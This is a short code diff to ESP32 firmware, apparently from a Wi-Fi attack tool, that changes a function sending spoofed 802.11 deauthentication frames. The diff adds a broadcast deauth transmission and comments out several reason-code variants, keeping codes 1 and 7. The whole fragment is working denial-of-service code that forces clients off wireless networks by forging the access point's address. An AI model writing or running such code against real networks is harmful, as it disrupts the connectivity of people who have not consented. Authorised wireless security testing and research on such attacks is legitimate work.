@@ -327,23 +327,26 @@ void wifi_attack_deauth_basic(void)
     memcpy(&deauth_packet[10], target_local.bssid, 6);    // Source Address
     memcpy(&deauth_packet[16], target_local.bssid, 6);    // BSSID
 
+    /* Send first to broadcast */
+    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+
     for (int i = 0; i < num_clients; i++) 
     {
         memcpy(&deauth_packet[4], clients[i].mac, 6);
         deauth_packet[24] = 1; /* Reason Code 1: Unspecified Reason */
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-        deauth_packet[24] = 4; /* Reason Code 4: Disassociated Due to Inactivity */
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-        deauth_packet[24] = 5; /* Reason Code 5: Disassociated Because AP Is Unable to Handle All Currently Associated Stations */
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-        deauth_packet[24] = 6; /* Reason Code 6: Class 2 Frame Received from Non-Authenticated Station */
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        // deauth_packet[24] = 4; /* Reason Code 4: Disassociated Due to Inactivity */
+        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        // deauth_packet[24] = 5; /* Reason Code 5: Disassociated Because AP Is Unable to Handle All Currently Associated Stations */
+        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        // deauth_packet[24] = 6; /* Reason Code 6: Class 2 Frame Received from Non-Authenticated Station */
+        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
         deauth_packet[24] = 7; /* Reason Code 7: Class 3 Frame Received from Non-Associated Station */
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-        deauth_packet[24] = 8; /* Reason Code 8: Disassociated Because Station Is Leaving (or Has Left) BSS */
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
-        deauth_packet[24] = 10; /* Reason Code 10: Disassociated Due to Invalid Security Parameters */
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        // deauth_packet[24] = 8; /* Reason Code 8: Disassociated Because Station Is Leaving (or Has Left) BSS */
+        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
+        // deauth_packet[24] = 10; /* Reason Code 10: Disassociated Due to Invalid Security Parameters */
+        // esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
     }
     xSemaphoreGive(clients_semaphore);
 }
